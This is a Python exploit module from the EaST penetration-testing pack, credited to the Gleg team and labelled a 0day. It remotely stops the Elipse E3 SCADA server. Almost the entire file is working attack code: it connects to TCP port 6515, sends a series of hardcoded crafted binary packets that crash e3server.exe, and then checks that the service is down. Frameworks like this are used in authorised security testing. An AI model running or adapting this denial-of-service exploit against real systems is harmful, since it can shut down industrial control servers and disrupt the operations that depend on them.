#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
import sys
import time
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_Elipse_E3_e3server_remote_stop"
INFO['DESCRIPTION'] = "Elipse E3 e3server remote stop"
INFO['VENDOR'] = "https://www.elipse.com.br"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Specially crafted TCP request allows to remotely stop E3 server. Checked against version 4.8.0.
"""
INFO["DOWNLOAD_LINK"] = "https://www.elipse.com.br/en/downloads/"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "12 Feb, 2018. Written by Gleg team."
INFO['PATH'] = "Dos/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 6515


class exploit(Sploit):
    def __init__(self, host='192.168.1.110', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return

    def send(self, data):
        self.sock.send(data)
        return self.sock.recv(16000)

    def run(self):
        self.args()
        self.log('[*] Checking connection to %s:%s' % (self.host, self.port))
        self.sock = socket.socket()
        self.sock.connect((self.host, self.port))
        self.log('[+] Successfully connected')
        self.log('[*] Trying to stop e3server.exe')

        self.send("\x18\x00\x00\x00\x02\x00\x01\x40\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\x06\x00\x00\x00\x00\x00\x00\x00"
             )

        self.send("\x56\x00\x00\x00\x02\x00\x02\x40\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\x08\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x04\x00\x05\x00\xf5\x00" \
             "\x02\x00\x38\x00\x12\x00\x01\x00\x0e\x00\x02\x00\x02\x00\x12\x00" \
             "\x06\x00\x0e\x00\x6e\x00\x7a\x00\x0e\x00\x64\x00\x69\x00\x0e\x00" \
             "\x5a\x00\x5a\x00\x0e\x00\x50\x00\x50\x00\x0e\x00\x46\x00\x4b\x00" \
             "\x0e\x00\x38\x00\x3b\x00"
             )

        self.send("\x3c\x00\x00\x00\x02\x00\x03\x40\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\xe3\x67\x2d\x66\x43\x5b" \
             "\x8c\x41\x88\x99\x82\xfd\xf8\xd9\xb1\xe4\x48\x00\xe3\x67\x2d\x66" \
             "\x43\x5b\x8c\x41\x88\x99\x82\xfd\xf8\xd9\xb1\xe4"
             )

        self.send("\x42\x00\x00\x00\x02\x00\x04\x40\x00\x00\x00\x80\x00\x00\x00\x80" \
             "\x02\x00\x00\x00\x00\x00\x00\x00\x0d\x00\x00\x00\x00\x80\x32\x4f" \
             "\x1f\x00\x60\x23\xed\x49\x95\x7c\xed\x1e\x17\xad\x1f\x08\xfd\x21" \
             "\xb6\xc1\x4b\x90\x42\x4e\x94\x36\x39\x88\x72\x50\x38\xbc\x01\x00" \
             "\x00\x00"
             )

        self.sock.recv(4096)

        self.sock.send("\x18\x00\x00\x00\x02\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\x02\x00\x00\x00\x00\x00\x00\x00"
               )
        self.send("\xa6\x00\x00\x00\x02\x00\x06\x40\x00\x00\x00\x80\x00\x00\x00\x80" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x5e\x2c\xf7\xd1\xf2\x94" \
             "\x1c\x46\xa5\x9c\xbf\x66\x48\xde\x7b\x00\x08\x00\x00\x00\x00\x00" \
             "\x08\x00\x00\x00\x00\x00\x13\x00\x0b\x00\x00\x00\x0c\x00\x08\x00" \
             "\x08\x00\x5e\x00\x00\x00\x01\x00\x5e\x00\x00\x00\x05\x00\x00\x00" \
             "\x55\x00\x73\x00\x65\x00\x72\x00\x00\x00\x08\x00\x01\x00\x00\x00" \
             "\x00\x00\x04\x00\x00\x00\x50\x00\x77\x00\x64\x00\x00\x00\x08\x00" \
             "\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x4d\x00\x61\x00\x63\x00" \
             "\x68\x00\x69\x00\x6e\x00\x65\x00\x00\x00\x08\x00\x0b\x00\x00\x00" \
             "\x50\x00\x45\x00\x4e\x00\x54\x00\x45\x00\x53\x00\x54\x00\x2d\x00" \
             "\x50\x00\x43\x00\x00\x00"
             )
        self.sock.close()
        time.sleep(5)
        s=socket.socket()
        try:
            s.connect((self.host, self.port))
        except:
            self.log('[+] Can\'t connect to %s:%s' % (self.host, self.port))
            self.finish(True)
        self.log('[-] Service still alive. Try again.')
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()